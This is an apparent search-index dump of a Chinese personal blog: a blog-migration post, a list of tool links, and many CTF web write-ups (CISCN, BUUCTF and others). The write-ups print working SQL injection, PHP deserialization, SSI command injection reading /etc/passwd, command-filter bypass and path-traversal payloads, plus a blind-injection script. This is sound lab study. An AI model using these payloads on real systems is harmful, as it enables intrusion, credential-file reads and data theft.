[{"categories":["瞎折腾"],"content":"大四开始写毕业设计了，在学的过程中想记一记笔记，但是之前的hexo博客没动很久了，就想着把博客搬迁下顺便起个头，激起一些学习的劲头。 ","date":"2022-01-31","objectID":"/posts/%E5%8D%9A%E5%AE%A2%E6%90%AC%E8%BF%81/:0:0","series":null,"tags":["博客搬迁"],"title":"博客搬迁","uri":"/posts/%E5%8D%9A%E5%AE%A2%E6%90%AC%E8%BF%81/#"},{"categories":["瞎折腾"],"content":"为什么选择Hugo因为静态的网站生成框架也没几个，搜索的时候也就hexo、hugo、jekyll。之前用的hexo确实很顺手，但是自己改网站，加功能的时候搞了好多依赖，感觉很臃肿，当时的博客文件夹带上依赖大概就有500+MB，现在换了hugo看下是90MB。 hugo还有一个特点就是生成网站的速度很快。这一点我没有截图作比较，但是明显的感觉hugo比hexo快好多。引用一片文章里的一句话： 根据相关博主提供的数据，他200篇左右的博文用Hexo 需要10分钟去生成静态网页，而Hugo 只需要10秒。 所以感觉要是长期写东西的话，选个好的框架也是个长远的选择。 hugo在github上的⭐也比hexo多。 不过在迁移的过程中，最大的感受就是：Hugo在国内的使用者不多。 网上想要找个合适的教程非常难，然后就是去官网啃英文的文档。而且hugo框架和hexo比起来完全的不一样，鄙人go还没接触过，主要还是自己菜。一开始选了coder这个主题，但是觉得还是对hugo本身的了解不够多，四处碰壁，最后选择了一个有国人维护的也是我现在在用的主题，就是DoIt，这个主题也是从上一代的主题迭代下来的，因为原来的那个已经很久没有维护了(可能觉得已经完工了)。这个主题的教程也很友好，摸完感觉我有点上手了。 ","date":"2022-01-31","objectID":"/posts/%E5%8D%9A%E5%AE%A2%E6%90%AC%E8%BF%81/:0:0","series":null,"tags":["博客搬迁"],"title":"博客搬迁","uri":"/posts/%E5%8D%9A%E5%AE%A2%E6%90%AC%E8%BF%81/#为什么选择hugo"},{"categories":["瞎折腾"],"content":"博客的部署之前使用hexo，在最后使用的时候发现了Travis CI - Test and Deploy with Confidence 持续集成这个好东西，每次在本地写完博客以后push到github的仓库，然后这个app会自动构建博客发布到github pages。 所以这次也是一样的选择，一个仓库用来放博客本体(顺便当一个备份)，使用持续集成发布到github pages和自己服务器里。不过这次学到的是github Actions。因为之前有用过一些自动签到的脚本，所以这个东西也略有了解，差不多就借一个生产环境干一些事情。具体的配置github的官方docs也写的比较清楚还有中文翻译，上手还看了一篇阮老师的博客GitHub Actions 入门教程。 发布到自己服务器上那块感觉处理的还不是很好，找了好几种方法：ftp上传、webhook，最后用了执行git clone的命令从github pages拉仓库。 所以最后的部署的流程就是： 本地push到github仓库 –\u003e 仓库Actions发布到github pages、服务器拉取page仓库。 ","date":"2022-01-31","objectID":"/posts/%E5%8D%9A%E5%AE%A2%E6%90%AC%E8%BF%81/:0:0","series":null,"tags":["博客搬迁"],"title":"博客搬迁","uri":"/posts/%E5%8D%9A%E5%AE%A2%E6%90%AC%E8%BF%81/#博客的部署"},{"categories":["CTF"],"content":"easy_sql在用户名处，尝试sql注入，加上单引号报错，测试闭合，随便添加几个符号在password的报错附近中注意到了是括号单引号闭合 You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ‘1’) LIMIT 0,1' at line 1 过滤的字符有union，所以尝试报错注入，查询版本号。 admin') and (extractvalue(1,concat(0x7e,(select version()),0x7e)))# 接下来想要通过information_schema库查字段，但是发现被过滤了，所以猜表名和字段名，尝试出了flag表和表中的一个字段id，但是在id字段中只查询出了一个值：1，使用sqlmap跑也没跑出来。 最后参考了网上的一篇文章：mysql 注入 information_schema_绕过IDS过滤information_schema继续注入，模仿文章构造payload admin') and (extractvalue(1,concat(0x7e,(select * from (select * from flag a join flag b USING (id))c),0x7e)))# 回显为：Duplicate column name ‘no’，一开始以为是报了个错，但是根据文章使用using继续把查到的no字段加上去，发现还有其他字段 Duplicate column name '28d9f90a-4120-4ee8-9079-4e7613699510' 直接得到一个假的flag，真的还在flag表中，查询flag表中的改字段，报错注入长度有限制，所以加个substr一段一段截就出来了 admin') and (extractvalue(1,concat(0x7e,substr((select `28d9f90a-4120-4ee8-9079-4e7613699510` from `flag`),1,30),0x7e)))# flag：CISCN{SWAqt-siWro-Wi7jV-FTdRm-9iOkG-} ","date":"2021-08-18","objectID":"/posts/ciscn%E7%BA%BF%E4%B8%8A%E8%B5%9B%E5%BA%93%E5%AD%98/:0:0","series":null,"tags":["web","sql注入","php原生类"],"title":"CISCN线上赛库存","uri":"/posts/ciscn%E7%BA%BF%E4%B8%8A%E8%B5%9B%E5%BA%93%E5%AD%98/#easy_sql"},{"categories":["CTF"],"content":"easy_source使用目录扫描，扫描到了.index.php.swo 本题目没有其他代码了噢，就只有这一个文件，虽然你看到的不完全，但是你觉得我会把flag藏在哪里呢，仔细想想文件里面还有什么？ \u003c?php class User { private static $c = 0; function a() { return ++self::$c; } function b() { return ++self::$c; } function c() { return ++self::$c; } function d() { return ++self::$c; } function e() { return ++self::$c; } function f() { return ++self::$c; } function g() { return ++self::$c; } function h() { return ++self::$c; } function i() { return ++self::$c; } function j() { return ++self::$c; } function k() { return ++self::$c; } function l() { return ++self::$c; } function m() { return ++self::$c; } function n() { return ++self::$c; } function o() { return ++self::$c; } function p() { return ++self::$c; } function q() { return ++self::$c; } function r() { return ++self::$c; } function s() { return ++self::$c; } function t() { return ++self::$c; } } $rc=$_GET[\"rc\"]; $rb=$_GET[\"rb\"]; $ra=$_GET[\"ra\"]; $rd=$_GET[\"rd\"]; $method= new $rc($ra, $rb); var_dump($method-\u003e$rd()); 看最后的参数列表，使用参数创建对象，并且创建对象的初始化参数需要有两个$ra、$rb ，源码虽然给出了User类，但是不知道有什么其他的方法，这时候想到了可能使用PHP的原生类。 根据提示 虽然你看到的不完全，但是你觉得我会把flag藏在哪里呢，仔细想想文件里面还有什么？ 应该想到看不完全可能是在代码注释中，百度获取类中的代码注释，可以得到一个ReflectionMethod类，并且ReflectionMethod类中刚好有一个getDocComment 方法可以获得注释： 简介：ReflectionMethod 类报告了一个方法的有关信息。类报告了一个方法的有关信息 ReflectionFunctionAbstract::getDocComment — 获取注释内容 源码中初始化创建对象为new $rc($ra, $rb)，传递了两个参数，ReflectionMethod类的初始化魔术方法也提供了两个参数 public ReflectionMethod::__construct ( mixed $class , string $name ) 所以构造第一个参数是User，第二个参数为源码里的那些方法名，一个一个尝试，在q方法中找到了flag的注释 payload ?rc=ReflectionMethod\u0026ra=User\u0026rb=q\u0026rd=getDocComment 结果 你能发现我吗string(152) \"/** * Increment counter * * @final * @static * @access publicCISCN{uLG8v-wGDDi-PfF4M-Pmc2U-uBqB2-} * @return int */\" 题外话：在尝试过程中还发现了另一个类ReflectionClass 简介：ReflectionClass 类报告了一个类的有关信息。 和上面的那个类对比，两个类研究的对象不一样ReflectionMethod研究的是类中的方法，ReflectionClass 研究的是类。 这个类中也有一个获得注释的函数ReflectionClass::getDocComment，但是其获得的是文档注释，即文件开头的/**/中内容，但是本题的注释是在函数里的。 ","date":"2021-08-18","objectID":"/posts/ciscn%E7%BA%BF%E4%B8%8A%E8%B5%9B%E5%BA%93%E5%AD%98/:0:0","series":null,"tags":["web","sql注入","php原生类"],"title":"CISCN线上赛库存","uri":"/posts/ciscn%E7%BA%BF%E4%B8%8A%E8%B5%9B%E5%BA%93%E5%AD%98/#easy_source"},{"categories":["分享"],"content":"工具网站nginx配置生成 万词王 WantWords Learn Git Branching ","date":"2021-07-31","objectID":"/posts/%E7%94%A8%E7%9A%84%E9%A1%BA%E6%89%8B%E7%9A%84%E7%BD%91%E7%AB%99/:0:0","series":null,"tags":null,"title":"用的顺手的网站","uri":"/posts/%E7%94%A8%E7%9A%84%E9%A1%BA%E6%89%8B%E7%9A%84%E7%BD%91%E7%AB%99/#工具网站"},{"categories":["分享"],"content":"视频解析接口https://vip.parwix.com:4433/player/?url= ","date":"2021-07-31","objectID":"/posts/%E7%94%A8%E7%9A%84%E9%A1%BA%E6%89%8B%E7%9A%84%E7%BD%91%E7%AB%99/:0:0","series":null,"tags":null,"title":"用的顺手的网站","uri":"/posts/%E7%94%A8%E7%9A%84%E9%A1%BA%E6%89%8B%E7%9A%84%E7%BD%91%E7%AB%99/#视频解析接口"},{"categories":["分享"],"content":"云短信、云邮件 短信 云短信 - 在线短信接收 （永久免费）短信验证码在线接收码平台 - 隐私短信 www.yinsiduanxin.com 邮件 10 Minute Mail - Free Anonymous Temporary email - 10 Minute Mail - Free Anonymous Temporary email 10分钟邮箱 ","date":"2021-07-31","objectID":"/posts/%E7%94%A8%E7%9A%84%E9%A1%BA%E6%89%8B%E7%9A%84%E7%BD%91%E7%AB%99/:0:0","series":null,"tags":null,"title":"用的顺手的网站","uri":"/posts/%E7%94%A8%E7%9A%84%E9%A1%BA%E6%89%8B%E7%9A%84%E7%BD%91%E7%AB%99/#云短信云邮件"},{"categories":["分享"],"content":"看动漫的网站迅播动漫影院-无需迅播的动漫网! 风车动漫－专注动漫的门户网站 在线动画 动漫下载 - AGE动漫 布丁动画官网_布丁动漫_布丁520 - 布丁动画 樱花动漫手机版-专注动漫的门户网站 轻小说文库 - 最新最全的日本动漫轻小说在线阅读与下载基地 ","date":"2021-07-31","objectID":"/posts/%E7%94%A8%E7%9A%84%E9%A1%BA%E6%89%8B%E7%9A%84%E7%BD%91%E7%AB%99/:0:0","series":null,"tags":null,"title":"用的顺手的网站","uri":"/posts/%E7%94%A8%E7%9A%84%E9%A1%BA%E6%89%8B%E7%9A%84%E7%BD%91%E7%AB%99/#看动漫的网站"},{"categories":["分享"],"content":"TZfree proxies抓取 - Google 搜索 ACL4SSR 在线订阅转换 免费节点(可能因为长时间没人访问应用要启动一下，稍等会) ","date":"2021-07-31","objectID":"/posts/%E7%94%A8%E7%9A%84%E9%A1%BA%E6%89%8B%E7%9A%84%E7%BD%91%E7%AB%99/:0:0","series":null,"tags":null,"title":"用的顺手的网站","uri":"/posts/%E7%94%A8%E7%9A%84%E9%A1%BA%E6%89%8B%E7%9A%84%E7%BD%91%E7%AB%99/#tz"},{"categories":["CTF"],"content":"ReadlezPHP源码找到time.php?source \u003c?php #error_reporting(0); class HelloPhp { public $a; public $b; public function __construct(){ $this-\u003ea = \"Y-m-d h:i:s\"; $this-\u003eb = \"date\"; } public function __destruct(){ $a = $this-\u003ea; $b = $this-\u003eb; echo $b($a); } } $c = new HelloPhp; if(isset($_GET['source'])) { highlight_file(__FILE__); die(0); } @$ppp = unserialize($_GET[\"data\"]); 分析一波：最后一行一个反序列化，所以很明显是反序列化的题目，在HelloPhp中有一个__destruct方法，会在创建的对象销毁时执行，注意里面有一个echo输出，最重要的是后面的函数调用 ，好像是在PHP7某个版本之后只是使用形如$a($b)格式进行函数调用，假如变量a为字符串var_dump，b是任意字符串，就相当于调用var_dump函数且参数为b。 所以构造反序列化，调用assert函数执行phpinfo。如果向assert() 函数传递字符串，它将会被 assert() 当做 PHP 代码来执行)： \u003c?php class HelloPhp { public $a='phpinfo()'; public $b='assert'; } $s=new HelloPhp(); echo serialize($s); POST请求 time.php?data=O:8:\"HelloPhp\":2:{s:1:\"a\";s:9:\"phpinfo()\";s:1:\"b\";s:6:\"assert\";} 页面查找flag，在environment中找到flag ","date":"2021-04-20","objectID":"/posts/readlezphpeasysearch/:0:0","series":null,"tags":["反序列化","SSI注入"],"title":"ReadlezPHP\u0026EasySearch","uri":"/posts/readlezphpeasysearch/#readlezphp"},{"categories":["CTF"],"content":"EasySearch进入页面以后试了试sql注入发现没用。第一步是看了wp找到的：使用扫描器扫描到index.php.swp文件： \u003c?php ob_start(); function get_hash(){ $chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^\u0026*()+-'; $random = $chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)];//Random 5 times $content = uniqid().$random; return sha1($content); } header(\"Content-Type: text/html;charset=utf-8\"); *** if(isset($_POST['username']) and $_POST['username'] != '' ) { $admin = '6d0bc1'; if ( $admin == substr(md5($_POST['password']),0,6)) { echo \"\u003cscript\u003ealert('[+] Welcome to manage system')\u003c/script\u003e\"; $file_shtml = \"public/\".get_hash().\".shtml\"; $shtml = fopen($file_shtml, \"w\") or die(\"Unable to open file!\"); $text = ' *** *** \u003ch1\u003eHello,'.$_POST['username'].'\u003c/h1\u003e *** ***'; fwrite($shtml,$text); fclose($shtml); *** echo \"[!] Header error ...\"; } else { echo \"\u003cscript\u003ealert('[!] Failed')\u003c/script\u003e\"; }else { *** } *** ?\u003e 登陆功能又一个验证，需要传入的passwd参数使用md5加密以后是以6d0bc1开头的。简单写个脚本跑一下就有了： # codeing=utf-8 import hashlib cnt=1; while True: md=hashlib.md5(str(cnt).encode(\"utf8\")).hexdigest() if md.startswith(\"6d0bc1\"): print(cnt) cnt+=1 #2020666 #2305004 分析源码登陆以后会创建一个欢迎页，使用POST请求，抓包可以在响应头里找到创建文件的位置和名称。 看了看文件后缀是一格没有见过的：shtml，然后学到到了shtml有一种漏洞：SSI注入漏洞 SSI 注入全称Server-Side Includes Injection，即服务端包含注入。SSI 是类似于 CGI，用于动态页面的指令。SSI 注入允许远程在 Web 应用中注入脚本来执行代码。 简单的命令执行 \"--\u003e'--\u003e`--\u003e\u003c\u003c!--#exec cmd=\"cat /etc/passwd\"--\u003e 我使用了反弹shell，自行修改一下命令即可。在/var/www/html目录下可以找到一个名为flag_990c66bf85a09c664f0b6741840499b2的文件，获得flag ","date":"2021-04-20","objectID":"/posts/readlezphpeasysearch/:0:0","series":null,"tags":["反序列化","SSI注入"],"title":"ReadlezPHP\u0026EasySearch","uri":"/posts/readlezphpeasysearch/#easysearch"},{"categories":["CTF"],"content":"还是同一场比赛的界面 这次测试了下面的登陆框已经不能用了，无论怎么输入都是同一个回显：你可别被我逮住了，臭弟弟，测试上面的序号，注意此时的url中有?id=猜测是一个注入点，输入单引号一直报错，但是输入2-1时成功回显，判断是一个数字型注入，数字型注入最多遇到的就是结合盲注，接下来是测试盲注的过滤。 发现if、union、and等被过滤，在整个字符串中如果出现空格会被拦下，ord、ascii等转换字符没有被过滤，if被过滤可以使用strcmp函数等代替，空格可以使用括号绕过。 贴出来自己的脚本： # codeing=utf-8 import requests import time url='http://1e069783-5d06-4d70-af82-c457e0d11a52.node3.buuoj.cn/search.php?id=' result='' for x in range(1, 100): high = 127 low = 32 mid = (low + high) // 2 while high\u003elow: # sql=\"(ORD(SUBSTR((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),%d,1))=%d)\"%(i,c) # sql = \"(ORD(SUBSTR((select(group_concat(column_name))from(information_schema.columns)where(table_name='F1naI1y')),%d,1))\u003e%d)\" % (x, mid) sql = \"(ORD(SUBSTR((select(group_concat(password))from(F1naI1y)where(id=9)),%d,1))\u003e%d)\" % (x, mid) time.sleep(0.1) reponse=requests.get(url+sql) if \"Click\" in reponse.text: low=mid+1 else: high = mid mid = (low+high)/2 result += chr(int(mid)) print(result) 我是直接使用了判断字符的返回值1或0作为id的参数，因为使用group_concat拼接时字符串有逗号,所以字符ascii需要至少从44开始。 下面是查询到的两个表F1naI1y 、Flaaaaag及结构 F1naI1y ====\u003e id,username,password Flaaaaag ====\u003e id,fl4gawsl 在第九项可以查得到flag，上面的sql语句已经准备好了。第一个是查询表名的，第二个是查询字段名，第三个是得到flag ","date":"2021-04-18","objectID":"/posts/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019finalsql/:0:0","series":null,"tags":["sql注入"],"title":"极客大挑战 2019 FinalSQL","uri":"/posts/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019finalsql/#"},{"categories":["CTF"],"content":"进入页面直接报错 试试其他的地方，我的习惯是git泄露、请求头、robots.txt、hint.txt都看看。果然在robots下有内容 User-agent: * Disallow: /fAke_f1agggg.php 访问fAke_f1agggg.php并且抓包，在响应头里有提示。 访问fl4g.php才正式开始，源码如下： \u003cimg src=\"/img.jpg\"\u003e \u003c?php header('Content-type:text/html;charset=utf-8'); error_reporting(0); highlight_file(__file__); //level 1 if (isset($_GET['num'])){ $num = $_GET['num']; if(intval($num) \u003c 2020 \u0026\u0026 intval($num + 1) \u003e 2021){ echo \"我不经意间看了看我的劳力士, 不是想看时间, 只是想不经意间, 让你知道我过得比你好.\u003c/br\u003e\"; }else{ die(\"金钱解决不了穷人的本质问题\"); } }else{ die(\"去非洲吧\"); } //level 2 if (isset($_GET['md5'])){ $md5=$_GET['md5']; if ($md5==md5($md5)) echo \"想到这个CTFer拿到flag后, 感激涕零, 跑去东澜岸, 找一家餐厅, 把厨师轰出去, 自己炒两个拿手小菜, 倒一杯散装白酒, 致富有道, 别学小暴.\u003c/br\u003e\"; else die(\"我赶紧喊来我的酒肉朋友, 他打了个电话, 把他一家安排到了非洲\"); }else{ die(\"去非洲吧\"); } //get flag if (isset($_GET['get_flag'])){ $get_flag = $_GET['get_flag']; if(!strstr($get_flag,\" \")){ $get_flag = str_ireplace(\"cat\", \"wctf2020\", $get_flag); echo \"想到这里, 我充实而欣慰, 有钱人的快乐往往就是这么的朴实无华, 且枯燥.\u003c/br\u003e\"; system($get_flag); }else{ die(\"快到非洲了\"); } }else{ die(\"去非洲吧\"); } ?\u003e 一关一关的bypass。 第一关 重点在intval函数，intval函数有个特性: 直到遇上数字或正负符号才开始做转换，再遇到非数字或字符串结束时(\\0)结束转换 这里需要num的值小于2020，加一后值大于2021，可以使用科学计数法方法绕过。构造payload2e9，遇到第一个函数转换时，因为是以2开头下一位是字符，会直接被截取为2；遇到第二个函数，因为使用了$num + 1会进行类型转换，2e9会先使用科学计数法计算出值并+1。 第二关 需要一个md5值，对这个值再次使用md5加密以后，使用弱类型比较，和原来的值相同。md5的一个弱类型比较绕过： PHP在处理哈希字符串时，它把每一个以“0E”开头的哈希值都解释为0，所以如果两个不同的密码经过哈希以后，其哈希值都是以“0E”开头的，那么PHP将会认为他们相同，都是0。 使用脚本跑一下得到一个值：0e215962017。 最后一层，是一个system函数执行，但是在之前有一些过滤 strstr函数匹配空格，可以使用${IFS}绕过（这个里面有更详细的：命令执行漏洞利用及绕过方式总结） str_ireplace会吧cat替换成wctf2020，所以不能使用cat命令，可以用：more、less、od、tail等等绕过，上面的博客里也有写道。 先使用ls查看下当前目录下的文件，发现一个名为fllllllllllllllllllllllllllllllllllllllllaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag读取得到flag。 最终payload： /fl4g.php?num=2e9\u0026md5=0e215962017\u0026get_flag=more${IFS}fllllllllllllllllllllllllllllllllllllllllaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag ","date":"2021-04-16","objectID":"/posts/wustctf2020%E6%9C%B4%E5%AE%9E%E6%97%A0%E5%8D%8E/:0:0","series":null,"tags":["RCE"],"title":"WUSTCTF2020 朴实无华","uri":"/posts/wustctf2020%E6%9C%B4%E5%AE%9E%E6%97%A0%E5%8D%8E/#"},{"categories":["CTF"],"content":"一个登陆界面，再看下url地址为login.php，确认了使用的是php 直接查看源码，在源码中找到了register.php。先注册一个进去看一看。 是一个发布广告的信息页，发布广告时需要输入广告的标题和内容，联想一下之前做过的发布文章的，应该是sql注入，输入广告标题输入一个单引号'试一试 广告详情中出现了数据库报错 猜测应该是二次注入，发布时加上一些转义字符没有出现错误，但是查看详情时再次从数据库中取出带有payload的数据，可以执行sql语句。而且上面的单引号测试出来了是字符型单引号闭合。 接下来是尝试过滤。我试出来的有空格（使用/**/绕过）、or，and（可以使用\u0026\u0026，||），同时or被过滤，就说明保存数据库表名的库information_schema没有办法查询，并且orderby也不能使用，需要使用其他办法获取表内容。 测试一下当前表的字段数，从1开始加，一直会报字段数不匹配，直到尝试到22。还需要主义的是执行的sql语句后面的 LIMIT 0,1需要闭合，所以最后添加了一个单引号 '/**/union/**/select/**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22' 说明回显位是2和3。 由于没有办法查询表名，所以需要我们自己猜测，CTF比赛中常见的表名就是flag、users、举办方的缩写啥的。这种没有办法查询表名的题目表名应该都不会设置太难 测试的语句 '/**/union/**/select/**/1,(select/**/*/**/from/**/flag),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22' 当测到users表时返回了当前字段数不匹配的错误，说名users里有多个字段，肯定没有办法显示在一列中。所以接下来是猜users表的字段数。 首先讲解一波无列名注入。 先来个正常表（flag）的查询 我们知道在sql语句查询的时候，可以给列名起别名形如 使用联合查询的时候，只要前后表的字段数相同，前面查询的就会成为表名 所以当我们不知道flag表的字段，并且想要查询里面的内容时，比如我想查询flag表的flag字段，可以构造 需要为子查询的结果再起一个别名（图中为x），这样我们就不用列名查询到了字段。总结一下思路就是：自己构造一个表名并且联合查询想要查询的表名，再使用group_concat函数输出自己构造的表名。 所以测试users表的字段数时，就通过形如上图的格式，改变联合查询的字段数判断。 最终的payload： '/**/union/**/select/**/1,(select/**/group_concat(b)/**/from(select/**/1,2/**/as/**/a,3/**/as/**/b/**/union/**/select/**/*/**/from/**/users)x),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22' ","date":"2021-04-15","objectID":"/posts/swpu2019web1/:0:0","series":null,"tags":["sql注入","无列名注入"],"title":"SWPU2019 Web1","uri":"/posts/swpu2019web1/#"},{"categories":["CTF"],"content":"寒假横向刷题（尽量） BUUCTF 💗🧡💛💚💙💜🤎🖤🤍 题都写这一个里面了，可以先用Ctrl+F搜索，还有部分是草稿还没有整理，不过我认为的思路已经整理出来了，看不懂还请大伙见谅。有问题了很乐意效劳💨 ","date":"2021-01-18","objectID":"/posts/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/:0:0","series":null,"tags":["web","BUUCTF_Web"],"title":"BUUCTF寒假刷题-Web","uri":"/posts/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/#"},{"categories":["CTF"],"content":"2021.01.15","date":"2021-01-18","objectID":"/posts/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/:0:0","series":null,"tags":["web","BUUCTF_Web"],"title":"BUUCTF寒假刷题-Web","uri":"/posts/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/#20210115"},{"categories":["CTF"],"content":"[HCTF 2018]WarmUp进到靶机一个硕大的滑稽，查看源码有提示source.php \u003c?php highlight_file(__FILE__); class emmm { public static function checkFile(\u0026$page) { $whitelist = [\"source\"=\u003e\"source.php\",\"hint\"=\u003e\"hint.php\"]; if (! isset($page) || !is_string($page)) { echo \"you can't see it\"; return false; } if (in_array($page, $whitelist)) { return true; } $_page = mb_substr( $page, 0, mb_strpos($page . '?', '?') ); if (in_array($_page, $whitelist)) { return true; } $_page = urldecode($page); $_page = mb_substr( $_page, 0, mb_strpos($_page . '?', '?') ); if (in_array($_page, $whitelist)) { return true; } echo \"you can't see it\"; return false; } } if (! empty($_REQUEST['file']) \u0026\u0026 is_string($_REQUEST['file']) \u0026\u0026 emmm::checkFile($_REQUEST['file']) ) { include $_REQUEST['file']; exit; } else { echo \"\u003cbr\u003e\u003cimg src=\\\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\\\" /\u003e\"; } ?\u003e 发现白名单有source.php和hint.php，先去查看一下hint.php flag not here, and flag in ffffllllaaaagggg 分析源码 判断$_REQUEST['file']对象为空且为字符串 执行emmm类中的checkFile方法判断是否在白名单（确保函数返回是true） 文件包含 checkFile函数中字符串截取判断是否在白名单（代码17-24和26-34）所以有两种绕过方法。 第一种 file=hint.php?../../../../../ffffllllaaaagggg 字符串截取将原字符串尾部加上?再截取第一个?之前的内容。所以需要在构造payload时问号前需要是白名单里的文件。问号之后，猜测flag位置在根目录下，所以使用尽可能多的../返回上级目录。 第二种 hint.php%3F..%2F..%2F..%2F..%2F..%2Fffffllllaaaagggg 将第一种payload使用urlencode编码即可。 ","date":"2021-01-18","objectID":"/posts/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/:0:0","series":null,"tags":["web","BUUCTF_Web"],"title":"BUUCTF寒假刷题-Web","uri":"/posts/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/#hctf-2018warmup"},{"categories":["CTF"],"content":"[强网杯 2019]随便注根据题目尝试sql注入，单引号报错，单引号加注释无报错，说明存在sql注入，当测试输入select时返回过滤的黑名单： return preg_match(\"/select|update|delete|drop|insert|where|\\./i\",$inject); 这道题使用的是堆叠注入，原理 在SQL中，分号（;）是用来表示一条sql语句的结束。试想一下我们在 ; 结束一个sql语句后继续构造下一条语句，会不会一起执行？因此这个想法也就造就了堆叠注入。而union injection（联合注入）也是将两条语句合并在一起，两者之间有什么区别么？区别就在于union 或者union all执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句。例如以下这个例子。用户输入：1; DELETE FROM products服务器端生成的sql语句为：（因未对输入的参数进行过滤）Select * from products where productid=1;DELETE FROM products当执行查询后，第一条显示查询信息，第二条则将整个表进行删除。 查看数据库 1';show databases; 查看当前库下的表 1';show tables; 查看两张表字段 1';show columns from words; 还有一种查看表的语句，在windows系统下，反单引号（`）是数据库、表、索引、列和别名用的引用符 1';desc `1919810931114514`; 找到了flag在的字段，接下来就是如何获取该字段的值。顺带一提，根据表的结构，初步判断默认查询的是word表中的字段，而flag在1919810931114514表中。 网上找到的两种方法，分别是修改表名和使用预处理语句。 使用预处理语句 因为select被过滤了，但是可以使用char函数，char() 函数将select的ASCII码转换为select字符串，接着利用concat()函数进行拼接得到select查询语句，从而绕过过滤。或者直接用concat()函数拼接select来绕过。 char(115,101,108,101,99,116) 根据预处理语句格式构造payload 创建一个sqli字符串值为查询sql语句，使用预处理语句赋值并执行。 1';SET @sqli=concat(char(115,101,108,101,99,116),'* from `1919810931114514`');PREPARE hacker from @sqli;EXECUTE hacker;# 不使用变量 1';PREPARE sqli FROM CONCAT('s','elect',' * from `1919810931114514`');EXECUTE sqli; # 还有一种 1';SET @sqli = CONCAT('s','e','l','e','c','t',' * from `1919810931114514`');PREPARE haha FROM@sqli ;EXECUTE haha; # 主要区别在于过滤的绕过方式，不要拘泥于一种方式。 修改表名 修改表名的思路是：默认查询的是word表第一个字段，所以把word表修改为其他名称，将flag所在的1919810931114514表名修改为word。 网上payload 0';rename table words to words1;rename table `1919810931114514` to words;alter table words change flag id varchar(100) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL;desc words;# 自己构造的payload 0';rename table words to words1;rename table `1919810931114514` to words;alter table words change flag id varchar(100) # 之后执行 1' or 1=1 # 查询表所有字段值即可。 ","date":"2021-01-18","objectID":"/posts/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/:0:0","series":null,"tags":["web","BUUCTF_Web"],"title":"BUUCTF寒假刷题-Web","uri":"/posts/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/#强网杯-2019随便注"},{"categories":["CTF"],"content":"[极客大挑战 2019]EasySQL用户名密码，尝试万能密码。 'or 1=1 # 随便密码 一个万能密码的参考:https://www.cnblogs.com/pass-A/p/11134988.html ","date":"2021-01-18","objectID":"/posts/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/:0:0","series":null,"tags":["web","BUUCTF_Web"],"title":"BUUCTF寒假刷题-Web","uri":"/posts/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/#极客大挑战-2019easysql"},{"categories":["CTF"],"content":"[极客大挑战 2019]Havefun直接源码找到php代码。payload ?cat=dog ","date":"2021-01-18","objectID":"/posts/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/:0:0","series":null,"tags":["web","BUUCTF_Web"],"title":"BUUCTF寒假刷题-Web","uri":"/posts/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/#极客大挑战-2019havefun"},{"categories":["CTF"],"content":"[SUCTF 2019]EasySQL单引号无报错，尝试堆叠注入可以回显。 和 [强网杯 2019]随便注这道题一样查库查表查字段 1;show databases; 1;show tables; 但是执行 1;desc`Flag`;1;showcolumnsfromFlag; 返回了\"Nonono.“测试出被过滤了：desc、from、Flag。 接下来的都是抄网上的预期解也是第一次见。 比赛时源码泄露 select $_GET['query'] || flag from flag 在oracle 缺省支持 通过 ‘ || ’ 来实现字符串拼接，但在mysql 缺省不支持。需要调整mysql 的sql_mode 模式：pipes_as_concat 来实现oracle 的一些功能 payload 1;set sql_mode=PIPES_AS_CONCAT;select 1 非预期解 *,1 ","date":"2021-01-18","objectID":"/posts/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/:0:0","series":null,"tags":["web","BUUCTF_Web"],"title":"BUUCTF寒假刷题-Web","uri":"/posts/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/#suctf-2019easysql"},{"categories":["CTF"],"content":"[ACTF2020 新生赛]Include不截图了，进入靶机只有一个tips等着被点。跳转以后看url中参数 ?file=flag.php 页面内容只有 Can you find out the flag? 立马想到使用php伪协议读文件内容。使用filter过滤器 ?file=php://filter/convert.base64-encode/resource=flag.php 得到 PD9waHAKZWNobyAiQ2FuIHlvdSBmaW5kIG91dCB0aGUgZmxhZz8iOwovL2ZsYWd7OTAyNTIyNDgtMjY3NC00NDdjLWFlYWMtYjc3ZTc5YjYwMzVmfQo= 解密得到flag 